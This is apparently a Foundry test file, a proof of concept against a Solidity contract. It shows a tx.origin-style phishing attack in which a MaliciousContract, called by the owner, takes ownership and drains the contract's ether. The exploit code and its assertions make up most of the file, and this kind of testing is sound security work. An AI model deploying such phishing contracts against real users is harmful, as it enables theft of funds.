// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/mycontract.sol";

contract MyContractTest is Test {
    MyContract public myContract;
    address owner = makeAddr("owner");
    address receiver = makeAddr("receiver");
    address attacker = makeAddr("attacker");
    uint256 initialBalance = 10 ether;

    function setUp() public {
        vm.prank(owner, owner);
        myContract = new MyContract();
        vm.deal(address(myContract), initialBalance);
    }

    function testPhishingAttack_transferOwnershipAndDrain() public {
        console.log("--- BEFORE-Trigger Exploit ---");
        // Verify owner has access to sendTo function
        uint256 initialSendAmount = 0.1 ether;
        uint256 contractBalanceBefore = address(myContract).balance;
        uint256 attackerBalanceBefore = attacker.balance;
        uint256 receiverBalanceBefore = receiver.balance;

        console.log("Test original owner access to sendTo");
        vm.prank(owner, owner);
        myContract.sendTo(receiver, initialSendAmount);
        
        uint256 contractBalanceAfter = address(myContract).balance;
        uint256 receiverBalanceAfter = receiver.balance;
        console.log("Owner successfully sent %d ETH to receiver", initialSendAmount);
        assertEq(contractBalanceAfter, contractBalanceBefore - initialSendAmount, "Contract balance mismatch");
        assertEq(receiverBalanceAfter, receiverBalanceBefore + initialSendAmount, "Receiver balance mismatch");

        MaliciousContract malicious = new MaliciousContract();
        
        console.log("--- Trigger Exploit (transferOwnership) ---");
        vm.prank(owner, owner);
        malicious.exploit(address(myContract), attacker);
        
        console.log("--- AFTER-Trigger Exploit ---");
        console.log("Verify original owner lost access and attacker gained access");
        // Original owner should no longer have access
        vm.startPrank(owner, owner);
        vm.expectRevert();
        myContract.sendTo(receiver, 1 wei);
        vm.stopPrank();
        
        console.log("Original owner's sendTo function call reverted - access lost");
        
        // Attacker should now have access
        vm.prank(attacker, attacker);
        myContract.sendTo(receiver, 1 wei);
        console.log("Attacker successfully called sendTo - access gained");
        
        console.log("--- BEFORE-Trigger Drain ---");
        contractBalanceBefore = address(myContract).balance;
        attackerBalanceBefore = attacker.balance;
        console.log("Contract balance: %d", contractBalanceBefore);
        console.log("Attacker balance: %d", attackerBalanceBefore);

        console.log("--- Trigger Drain ---");
        vm.prank(attacker, attacker);
        myContract.sendTo(attacker, contractBalanceBefore);
        
        console.log("--- AFTER-Trigger Drain ---");
        assertEq(address(myContract).balance, 0, "Contract funds not drained");
        assertEq(attacker.balance, attackerBalanceBefore + contractBalanceBefore, "Attacker didn't receive funds");
        console.log("Funds drained successfully!");
        
        console.log("Vulnerability Exists: Phishing attack successfully transferred ownership and drained funds");
    }

    function testPhishingAttack_sendTo() public {
        MaliciousContract malicious = new MaliciousContract();
        
        uint256 contractBalancePre = address(myContract).balance;
        uint256 receiverBalancePre = receiver.balance;
        
        console.log("--- Trigger sendTo exploit ---");
        vm.prank(owner, owner);
        malicious.stealFunds(address(myContract), receiver, contractBalancePre);
        
        console.log("--- AFTER sendTo exploit ---");
        assertEq(address(myContract).balance, 0, "Contract funds not drained");
        assertEq(receiver.balance, receiverBalancePre + contractBalancePre, "Receiver didn't receive funds");
    }
}

contract MaliciousContract {
    function exploit(address victimContract, address newOwner) external {
        MyContract(victimContract).transferOwnership(newOwner);
    }

    function stealFunds(address victimContract, address recipient, uint256 amount) external {
        MyContract(victimContract).sendTo(recipient, amount);
    }
}